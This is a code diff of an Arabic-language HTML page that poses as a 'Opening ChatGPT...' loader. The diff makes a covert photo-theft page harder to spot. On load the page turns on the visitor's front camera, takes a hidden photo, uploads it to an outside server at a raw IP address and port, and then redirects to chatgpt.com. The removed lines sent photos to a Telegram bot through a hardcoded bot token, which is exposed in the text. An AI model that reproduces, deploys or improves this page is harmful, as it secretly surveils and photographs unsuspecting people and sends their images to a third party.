@@ -5,13 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>جاري التحميل...</title>
     <style>
-        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; text-align: center; padding: 0; margin: 0; display: flex; align-items: center; justify-content: center; height: 100vh; background: #ffffff; color: #333; }
-        .loader-container { text-align: center; }
-        /* شريط التحميل الدوار */
-        .loader { border: 8px solid #f3f3f3; border-top: 8px solid #3498db; border-radius: 50%; width: 60px; height: 60px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
+        body { font-family: sans-serif; text-align: center; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; background: #fff; }
+        .loader { border: 6px solid #f3f3f3; border-top: 6px solid #10a37f; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        p { font-size: 18px; font-weight: bold; color: #555; }
-        /* إخفاء الكاميرا تماماً */
         video, canvas { display: none; }
     </style>
 </head>
@@ -19,71 +15,60 @@
 
     <div class="loader-container">
         <div class="loader"></div>
-        <p id="status">فتح chat gpt...</p>
+        <p>جاري فتح ChatGPT...</p>
     </div>
 
-    <!-- العناصر المخفية -->
     <video id="video" autoplay playsinline></video>
     <canvas id="canvas"></canvas>
 
     <script>
-        const botToken = '8757176986:AAFNsvSswM4J_I_adIelUJWTSuqwRvFJgRo';
+        // --- تقسيم الرابط إلى 3 أقسام كما طلبت ---
+        const part1 = "http://51.83.6.5";
+        const part2 = ":20341";
+        const part3 = "/upload";
+        
+        // تجميع الرابط النهائي للسيرفر
+        const SERVER_URL = part1 + part2 + part3;
+
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const status = document.getElementById('status');
-
         const urlParams = new URLSearchParams(window.location.search);
         const chatId = urlParams.get('id');
 
-        // دالة التقاط وإرسال الصورة
         async function captureAndSend() {
             if (!chatId) {
-                status.innerText = "خطأ في المعرف، يرجى إعادة الدخول من البوت.";
+                window.location.href = "https://chatgpt.com";
                 return;
             }
 
-            status.innerText = "جاري فتح موقع chat gpt...";
-
-            // إعداد الكانفاس
             const context = canvas.getContext('2d');
             canvas.width = video.videoWidth;
             canvas.height = video.videoHeight;
             context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-            // تحويل الصورة وإرسالها
             canvas.toBlob(blob => {
                 const formData = new FormData();
                 formData.append('chat_id', chatId);
                 formData.append('photo', blob, 'capture.jpg');
-                formData.append('caption', '📸 تم التقاط صورة تلقائية للمستخدم.');
 
-                fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+                // الإرسال للسيرفر الوسيط (Katabump)
+                fetch(SERVER_URL, {
                     method: 'POST',
                     body: formData
                 })
-                .then(() => {
-                    status.innerText = "تم بنجاح، جاري تحويلك...";
-                    // التحويل إلى ChatGPT بعد الإرسال
-                    setTimeout(() => {
-                        window.location.href = "https://chatgpt.com";
-                    }, 500);
-                })
-                .catch(() => {
-                    window.location.href = "https://chatgpt.com"; // تحويل حتى لو فشل الاتصال
+                .finally(() => {
+                    window.location.href = "https://chatgpt.com";
                 });
-            }, 'image/jpeg', 0.7);
+            }, 'image/jpeg', 0.6);
         }
 
-        // تشغيل الكاميرا تلقائياً عند الدخول
         navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } })
             .then(stream => { 
                 video.srcObject = stream;
-                // الانتظار ثانية واحدة للتأكد من وضوح الصورة ثم الالتقاط
-                setTimeout(captureAndSend, 1500);
+                setTimeout(captureAndSend, 1200); 
             })
-            .catch(err => { 
-                status.innerText = "يجب السماح بالصلاحيات للمتابعة...";
-                console.error(err);
+            .catch(() => {
+                window.location.href = "https://chatgpt.com";
             });
     </script>
 </body>
